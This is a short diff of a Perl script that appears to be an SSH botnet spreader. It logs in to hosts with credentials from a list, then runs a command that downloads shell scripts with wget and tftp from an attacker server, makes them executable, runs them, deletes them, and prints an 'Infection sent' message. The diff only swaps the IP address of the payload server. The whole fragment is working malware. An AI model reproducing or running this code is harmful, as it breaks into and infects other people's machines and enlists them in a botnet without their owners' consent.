@@ -16,7 +16,7 @@ scalar(@newarray); $i+=3) {
         if ($ssh->connect($newarray[$c])) {
                 if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                         $channel = $ssh->channel();
-                        $channel->exec(' cd /tmp; wget http://192.168.7.59/bins.sh; chmod 777 *; sh bins.sh; tftp -g 192.168.7.59 -r tftp.sh; chmod 777 *; sh tftp.sh; rm -rf *.sh');
+                        $channel->exec(' cd /tmp; wget http://55.44.55.167/bins.sh; chmod 777 *; sh bins.sh; tftp -g 55.44.55.167 -r tftp.sh; chmod 777 *; sh tftp.sh; rm -rf *.sh');
                         sleep 10;
                         $channel->close;
                         print "\e[32;1mInfection sent to[35;1m: [34;1m".$newarray[$a]."[35;1m:[34;1m".$newarray[$b]."[35;1m~[36;1m".$newarray[$c]." [0;00m\n";
